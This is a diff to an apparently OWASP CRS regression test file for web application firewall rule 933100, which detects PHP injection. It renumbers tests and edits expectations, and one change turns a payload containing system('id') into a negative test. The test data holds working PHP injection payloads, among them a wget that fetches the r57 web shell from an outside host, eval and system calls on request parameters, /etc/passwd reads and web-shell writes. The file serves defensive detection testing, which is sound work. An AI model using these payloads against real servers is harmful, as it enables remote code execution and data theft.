@@ -4,7 +4,9 @@ meta:
 rule_id: 933100
 tests:
   - test_id: 1
-    desc: PHP Injection Attack (933100) from old modsec regressions
+    desc: |
+      PHP Injection Attack: Short tag with exec function
+      decoded payload: <? exec('wget http://r57.biz/r57.txt -O
     stages:
       - input:
           dest_addr: 127.0.0.1
@@ -18,7 +20,7 @@ tests:
             User-Agent: "OWASP CRS test agent"
           method: GET
           port: 80
-          uri: "/get?foo=<?exec('wget%20http://r57.biz/r57.txt%20-O"
+          uri: "/get?foo=%3C%3F%20exec%28%27wget%20http%3A%2F%2Fr57.biz%2Fr57.txt%20-O"
           version: HTTP/1.1
         output:
           log:
@@ -654,7 +656,7 @@ tests:
           uri: "/get?foo=%3C%3Fxpaquet"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
   - test_id: 37
     desc: |
@@ -672,9 +674,9 @@ tests:
           uri: "/api/orders?flux=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3Corder%3E%3Cid%3E12345%3C%2Fid%3E%3C%2Forder%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 12
+  - test_id: 38
     desc: |
       PHP injection attack: Basic <?php tag
       decoded payload: <?php system('id'); ?>
@@ -692,7 +694,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 13
+  - test_id: 39
     desc: |
       PHP injection attack: <?PHP uppercase tag
       decoded payload: <?PHP echo "test"; ?>
@@ -710,7 +712,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 14
+  - test_id: 40
     desc: |
       PHP injection attack: <? short tag
       decoded payload: <? echo 'hello'; ?>
@@ -728,7 +730,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 15
+  - test_id: 41
     desc: |
       PHP injection attack: <? short tag with command execution
       decoded payload: <? system($_GET['c']); ?>
@@ -746,7 +748,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 16
+  - test_id: 42
     desc: |
       PHP injection attack: <?= short echo tag with expression
       decoded payload: <?=$_GET['data']?>
@@ -764,7 +766,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 17
+  - test_id: 43
     desc: |
       PHP injection attack: [php] opening tag
       decoded payload: [php]echo 'test';[/php]
@@ -782,7 +784,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 18
+  - test_id: 44
     desc: |
       PHP injection attack: <?php with file_get_contents
       decoded payload: <?php echo file_get_contents('/etc/passwd'); ?>
@@ -800,7 +802,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 19
+  - test_id: 45
     desc: |
       PHP injection attack: <?php with eval
       decoded payload: <?php eval($_POST['code']); ?>
@@ -820,7 +822,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 20
+  - test_id: 46
     desc: |
       PHP injection attack: <?php in POST body
       decoded payload: <?php passthru('ls -la'); ?>
@@ -840,7 +842,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 21
+  - test_id: 47
     desc: |
       PHP injection attack: <?php with shell_exec
       decoded payload: <?php $output = shell_exec('whoami'); ?>
@@ -858,7 +860,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 22
+  - test_id: 48
     desc: |
       PHP injection attack: <?php with include
       decoded payload: <?php include('/tmp/shell.php'); ?>
@@ -876,7 +878,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 23
+  - test_id: 49
     desc: |
       PHP injection attack: <?php with require
       decoded payload: <?php require($_GET['file']); ?>
@@ -894,7 +896,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 24
+  - test_id: 50
     desc: |
       PHP injection attack: <?php with assert
       decoded payload: <?php assert($_POST['c']); ?>
@@ -914,7 +916,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 25
+  - test_id: 51
     desc: |
       PHP injection attack: <?php with preg_replace /e modifier
       decoded payload: <?php preg_replace('/test/e', $_GET['c'], 'test'); ?>
@@ -932,7 +934,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 26
+  - test_id: 52
     desc: |
       PHP injection attack: <?php with backticks
       decoded payload: <?php $res = `id`; ?>
@@ -950,7 +952,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 27
+  - test_id: 53
     desc: |
       PHP injection attack: <?php with create_function
       decoded payload: <?php create_function('', $_GET['c']); ?>
@@ -968,7 +970,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 28
+  - test_id: 54
     desc: |
       PHP injection attack: <?php in Cookie
       payload: <?php phpinfo(); ?>
@@ -987,7 +989,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 29
+  - test_id: 55
     desc: |
       PHP injection attack: [PHP] uppercase tag
       decoded payload: [PHP]system('whoami');[/PHP]
@@ -1005,7 +1007,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 30
+  - test_id: 56
     desc: |
       PHP injection attack: <?xml polyglot with function call
       decoded payload: <?xml :system('ls');
@@ -1023,7 +1025,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 31
+  - test_id: 57
     desc: |
       PHP injection attack: <?xml polyglot with exec
       decoded payload: <?xml :exec('cat /etc/passwd');
@@ -1041,7 +1043,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 32
+  - test_id: 58
     desc: |
       PHP injection attack: <?xml polyglot with passthru
       decoded payload: <?xml :passthru('uname -a');
@@ -1059,7 +1061,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 33
+  - test_id: 59
     desc: |
       Negative test: Legitimate XML with namespace
       decoded payload: <?xml-stylesheet type="text/xsl" href="style.xsl"?>
@@ -1075,9 +1077,9 @@ tests:
           uri: "/get?data=%3C%3Fxml-stylesheet%20type%3D%22text%2Fxsl%22%20href%3D%22style.xsl%22%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 34
+  - test_id: 60
     desc: |
       Negative test: Legitimate XML declaration with standalone
       decoded payload: <?xml version="1.0" standalone="yes"?>
@@ -1093,9 +1095,9 @@ tests:
           uri: "/api?doc=%3C%3Fxml%20version%3D%221.0%22%20standalone%3D%22yes%22%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 35
+  - test_id: 61
     desc: |
       Negative test: HTML with question mark (not PHP tag)
       decoded payload: Is this a test? What do you think?
@@ -1111,9 +1113,9 @@ tests:
           uri: "/search?q=Is%20this%20a%20test%3F%20What%20do%20you%20think%3F"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 36
+  - test_id: 62
     desc: |
       Negative test: Math comparison with less-than and question mark
       decoded payload: result = (x < 5) ? yes : no
@@ -1129,9 +1131,9 @@ tests:
           uri: "/calc?expr=result%20%3D%20%28x%20%3C%205%29%20%3F%20yes%20%3A%20no"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 37
+  - test_id: 63
     desc: |
       Negative test: URL with query parameters
       decoded payload: http://example.com/page?id=123
@@ -1147,9 +1149,9 @@ tests:
           uri: "/get?url=http%3A%2F%2Fexample.com%2Fpage%3Fid%3D123"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 38
+  - test_id: 64
     desc: |
       Negative test: SVG with processing instruction
       decoded payload: <?xml version="1.0"?><svg></svg>
@@ -1166,9 +1168,9 @@ tests:
           data: "image=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Csvg%3E%3C%2Fsvg%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 39
+  - test_id: 65
     desc: |
       Negative test: XSLT processing instruction
       decoded payload: <?xsl-stylesheet?>
@@ -1184,9 +1186,9 @@ tests:
           uri: "/get?style=%3C%3Fxsl-stylesheet%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 40
+  - test_id: 66
     desc: |
       PHP injection attack: Minimal <? tag at end of input
       decoded payload: test<?
@@ -1204,7 +1206,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 41
+  - test_id: 67
     desc: |
       PHP injection attack: <?= with minimal content
       decoded payload: <?=1?>
@@ -1222,7 +1224,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 42
+  - test_id: 68
     desc: |
       PHP injection attack: <?php with file upload simulation
       decoded payload: <?php move_uploaded_file($_FILES['f']['tmp_name'], '/var/www/shell.php'); ?>
@@ -1242,7 +1244,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 43
+  - test_id: 69
     desc: |
       PHP injection attack: <?php with ob_start and eval
       decoded payload: <?php ob_start(); eval($_REQUEST['c']); ob_end_flush(); ?>
@@ -1260,7 +1262,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 44
+  - test_id: 70
     desc: |
       PHP injection attack: <?php with fopen and fwrite
       decoded payload: <?php $f=fopen('shell.php','w'); fwrite($f,'<?php eval($_GET[c]); ?>'); ?>
@@ -1278,7 +1280,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 45
+  - test_id: 71
     desc: |
       PHP injection attack: <?php with array callback execution
       decoded payload: <?php array_map("system",array("whoami")); ?>
@@ -1296,7 +1298,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 46
+  - test_id: 72
     desc: |
       Negative test: JavaScript ternary operator with PHP-like pattern
       decoded payload: var x = (a < b) ? c : d; // <?test comment
@@ -1312,9 +1314,9 @@ tests:
           uri: "/js?code=var%20x%20%3D%20%28a%20%3C%20b%29%20%3F%20c%20%3A%20d%3B%20%2F%2F%20%3C%3Ftest%20comment"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 47
+  - test_id: 73
     desc: |
       Negative test: Email address with brackets
       decoded payload: user@[192.168.1.1]
@@ -1330,9 +1332,9 @@ tests:
           uri: "/contact?email=user%40%5B192.168.1.1%5D"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 48
+  - test_id: 74
     desc: |
       PHP injection attack: <?pHp mixed case
       decoded payload: <?pHp SyStEm('id'); ?>
@@ -1350,7 +1352,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 49
+  - test_id: 75
     desc: |
       Negative test: XMP metadata tag (Extensible Metadata Platform)
       Issue 4443: <?xpacket should not trigger false positive
@@ -1368,9 +1370,9 @@ tests:
           data: "metadata=%3C%3Fxpacket%20begin%3D%22%3F%22%20id%3D%22W5M0MpCehiHzreSzNTczkc9d%22%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 50
+  - test_id: 76
     desc: |
       Negative test: XMP metadata closing tag
       Issue 4443: <?xpacket end="w"?> should not trigger false positive
@@ -1388,9 +1390,9 @@ tests:
           data: "metadata=%3C%3Fxpacket%20end%3D%22w%22%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 51
+  - test_id: 77
     desc: |
       Negative test: Minimal XMP tag
       Issue 4443: <?xpacket alone should not trigger
@@ -1407,9 +1409,9 @@ tests:
           uri: "/test?tag=%3C%3Fxpacket"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 52
+  - test_id: 78
     desc: |
       Negative test: XMP tag with uppercase
       Issue 4443: <?XPACKET should not trigger
@@ -1427,9 +1429,9 @@ tests:
           data: "xmp=%3C%3FXPACKET%20begin%3D%22%3F%22%20id%3D%22test%22%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 53
+  - test_id: 79
     desc: |
       Negative test: XMP metadata in typical PDF context
       Issue 4443: Full XMP block as found in PDF files
@@ -1447,9 +1449,9 @@ tests:
           data: "content=%3C%3Fxpacket%20begin%3D%22%3F%22%20id%3D%22W5M0MpCehiHzreSzNTczkc9d%22%3F%3E%3Cx%3Axmpmeta%20xmlns%3Ax%3D%22adobe%3Ans%3Ameta%2F%22%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 54
+  - test_id: 80
     desc: |
       Negative test: XMP with mixed case (realistic)
       Issue 4443: <?xPacket as might appear in some generators
@@ -1466,11 +1468,11 @@ tests:
           uri: "/meta?data=%3C%3FxPacket%20begin%3D%22%3F%22%20id%3D%22test%22%3F%3E"
           version: HTTP/1.1
         output:
-          no_log:
+          log:
             no_expect_ids: [933100]
-  - test_id: 55
+  - test_id: 81
     desc: |
-      PHP injection attack: Verify <?xphp still triggers (not XMP)
+      Negative test: <?xphp is not a valid PHP tag
       decoded payload: <?xphp system('id'); ?>
     stages:
       - input:
@@ -1485,8 +1487,8 @@ tests:
           version: HTTP/1.1
         output:
           log:
-            expect_ids: [933100]
-  - test_id: 56
+            no_expect_ids: [933100]
+  - test_id: 82
     desc: |
       PHP injection attack: Verify <?xa still triggers (not XMP, not XML)
       decoded payload: <?xa test
@@ -1504,7 +1506,7 @@ tests:
         output:
           log:
             expect_ids: [933100]
-  - test_id: 57
+  - test_id: 83
     desc: |
       PHP injection attack: Verify <?xb still triggers
       decoded payload: <?xb echo 1;
